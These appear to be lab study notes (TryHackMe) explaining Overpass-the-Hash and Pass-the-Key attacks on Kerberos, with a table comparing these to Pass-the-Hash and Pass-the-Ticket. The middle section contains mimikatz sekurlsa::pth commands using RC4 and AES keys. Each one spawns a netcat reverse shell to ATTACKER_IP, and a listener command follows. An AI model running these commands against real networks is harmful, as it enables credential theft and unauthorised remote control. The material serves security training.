# Overpass-the-Hash / Pass-the-Key

## Concept

Similar to Pass-the-Hash but applied to **Kerberos** networks. When a user requests a TGT, they send a timestamp encrypted with a key derived from their password. The derivation algorithm can be **DES** (disabled by default on current Windows), **RC4**, **AES128**, or **AES256**, depending on the Windows version and Kerberos configuration.

If we have any of those keys, we can ask the KDC for a TGT **without the actual password** — hence **Pass-the-Key (PtK)**. The key difference from PtH is that you use a password-derived **cryptographic key** rather than knowing the plaintext password.

During Kerberos pre-authentication the client encrypts a timestamp with a key derived from the user's password, and the KDC checks it before issuing the TGT. Important: the password-derived key is **not** the password itself.

## Pass-the-Key — Reverse Shell via `sekurlsa::pth`

Run the command matching the key you have (`nc64` is already on THMJMP2):

**RC4 hash:**
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**AES128 hash:**
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**AES256 hash:**
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Each option identifies the type of key supplied; the key must match the account and encryption type. `/user` and `/domain` identify the account; `/run` specifies the process to launch using the injected authentication material.

Start the listener on the AttackBox:
```
user@AttackBox$ nc -lvp 5556
```
As with PtH, any command run from this shell uses the credentials injected via Mimikatz.

> A returned reverse shell does **not** by itself prove Kerberos authentication succeeded — it only shows the launched process connected back. The actual authentication outcome depends on ticket acquisition and subsequent access.

## RC4 Key = NTLM Hash → Overpass-the-Hash

When using RC4, the key **equals the NTLM hash** of the user. So if you can extract the NTLM hash, you can use it to request a TGT as long as RC4 is an enabled protocol. This specific variant is **Overpass-the-Hash (OPtH)**.

The link between NTLM and Kerberos:
1. Attacker obtains a user's NTLM hash.
2. The domain permits RC4 Kerberos encryption.
3. The hash is used as the RC4 key for Kerberos authentication.
4. The attacker may obtain a TGT without knowing the plaintext password.

Modern environments can **restrict RC4**, so this technique is configuration-dependent. **AES keys are distinct keys** — you cannot substitute an NTLM hash where an AES key is required.

## PtH vs. PtK vs. OPtH vs. PtT

| Technique | What you have | What you use it for |
|---|---|---|
| Pass-the-Hash (PtH) | An NTLM hash | NTLM-based authentication |
| Pass-the-Key (PtK) | A Kerberos encryption key (AES128/AES256) | Kerberos authentication |
| Overpass-the-Hash (OPtH) | An NTLM hash used as the RC4 Kerberos key | Obtain a Kerberos TGT instead of relying on NTLM |
| Pass-the-Ticket (PtT) | An existing Kerberos ticket | Reuse that ticket for Kerberos authentication |

**Memory trick:**
- **PtH** — use the hash for NTLM authentication.
- **PtK** — use a Kerberos key for Kerberos authentication.
- **OPtH** — take an NTLM hash and use it as a Kerberos RC4 key to obtain a TGT.
- **PtT** — use a ticket that already exists.

OPtH is often described as a specific form of Pass-the-Key, because an NTLM hash is also the RC4 key for the user's Kerberos credentials.

**Central concept:** you do not necessarily need the plaintext password to authenticate. Depending on the protocol and configuration, a password-derived hash, a Kerberos encryption key, or an existing ticket can be enough:

```
Hash → NTLM:                          Pass-the-Hash
Hash → RC4 Kerberos key → TGT:        Overpass-the-Hash
AES/other Kerberos key → Kerberos:    Pass-the-Key
Existing ticket → reuse ticket:       Pass-the-Ticket
```
